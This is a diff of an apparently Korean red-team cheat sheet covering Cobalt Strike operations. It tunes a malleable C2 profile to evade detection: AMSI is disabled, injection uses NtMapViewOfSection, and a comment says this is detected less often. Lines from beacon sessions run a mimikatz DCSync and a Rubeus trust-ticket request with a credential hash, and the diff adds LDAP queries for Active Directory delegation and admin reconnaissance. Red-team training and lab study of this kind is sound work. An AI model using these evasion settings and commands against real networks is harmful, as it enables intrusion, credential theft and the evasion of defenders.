@@ -221,7 +221,7 @@ stage {
 }
 
 post-ex {
-	set pipename "dotnet-diagnostic-47123";
+	set pipename "dotnet-diagnostic-#####";
 	set amsi_disable "true";
 	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
 	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
@@ -237,6 +237,10 @@ post-ex {
 }
 
 process-inject {
+    set allocator "NtMapViewOfSection"; # VirtualAllocEx보다 탐지율이 낮음
+    set min_alloc "16384";
+	set userwx "false";
+	
 	execute {
 		NtQueueApcThread-s;
 		NtQueueApcThread;
@@ -1953,6 +1957,27 @@ beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-b
 
 ## Step 4. 신뢰받는 도메인에서 Trust Account의 TGT 요청
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
+```
+
+## 자주쓰는 ldapsearch
+```
+### 도메인, 그룹 조회
+beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
+
+### 사용자, 컴퓨터 조회
+beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
+
+### GPO 조회
+beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayname,gPCWQLFilter
+
+### Unconstrained Delegation 조회
+beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
+
+### Constrained Delegation 조회
+beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
+
+### 특정 그룹 구성원 검색
+beacon> ldapsearch "(&(samAccountType=268435456)(samAccountName=Domain Admins))" --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes member
 ```
 
 ## Reference
